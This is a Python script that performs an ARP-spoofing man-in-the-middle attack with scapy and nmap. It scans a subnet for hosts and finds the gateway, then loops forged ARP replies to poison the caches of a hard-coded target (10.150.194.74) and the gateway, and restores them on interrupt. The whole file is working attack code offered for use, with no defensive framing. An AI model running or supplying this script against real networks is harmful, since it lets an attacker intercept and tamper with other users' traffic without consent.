import os
from scapy.all import Ether, ARP, srp, IP, ICMP, send
import ipaddress
import nmap
import subprocess
import time


def disable_ip_routing():
    # Disable IP routing
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    os.system("sudo iptables --policy FORWARD DROP")

def enable_ip_routing():
    # Enable IP routing
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    os.system("sudo iptables --policy FORWARD ACCEPT")

def generate_host_ips(network_address, subnet_mask):
    # Combineer het netwerkadres en het subnetmasker om een netwerkobject te maken
    network = ipaddress.IPv4Network(f"{network_address}/{subnet_mask}", strict=False)
    host_ips = [str(ip) for ip in network.hosts()]
    return host_ips

def get_mac(ip):
    response = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=1, verbose=0)
    if len(response[0])!=0:
        return response[0][0][1].src
    else:
        return None

def get_all_mac(network_ip, subnet_mask):
    device_list=[]
    ips=generate_host_ips(network_ip, subnet_mask)
    for ip in ips:
        print(f"Getting mac address for {ip}")
        if get_mac(ip):
            device_list.append((ip, get_mac(ip)))

def ping_all_addresses(network_ip, subnet_mask):
    scanned_hosts = []
    # Maak een Nmap-scannerobject
    nm = nmap.PortScanner()

    # Voer een ARP-ping-scan uit
    nm.scan(hosts=f"{network_ip}/{subnet_mask}", arguments="-sn")

    for host in nm.all_hosts():
        try:
            mac_address = nm[host]['addresses']['mac']
            scanned_hosts.append((host, mac_address))
        except KeyError:
            scanned_hosts.append((host, None))
    return scanned_hosts

def get_default_gateway():
    gateway_ip=subprocess.check_output("ip route show default | awk '{print $3}'",shell=True).decode("utf-8").strip()
    mac_address=get_mac(gateway_ip)

    return (gateway_ip, mac_address)


def trick_targets(target_ip,target_mac, gateway_adress, gateway_mac):
    send(ARP(op=2, pdst=target_ip, psrc=gateway_adress, hwdst=target_mac))
    send(ARP(op=2, pdst=gateway_adress, psrc=target_ip, hwdst=gateway_mac))
    time.sleep(1)

def restore_arp(target_ip, target_mac, gateway_adress, gateway_mac):
    send(ARP(op=2, pdst=gateway_adress, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)
    send(ARP(op=2, pdst=target_ip, psrc=gateway_adress, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)

def mitm(target_address):
    gateway_adress, gateway_mac=get_default_gateway()
    try:
        while True:
            trick_targets(target_address, get_mac(target_address), gateway_adress, gateway_mac)
    except KeyboardInterrupt:
        print("Stopping MITM attack")
    restore_arp(target_address, get_mac(target_address), gateway_adress, gateway_mac)


if __name__ == "__main__":
    mitm("10.150.194.74")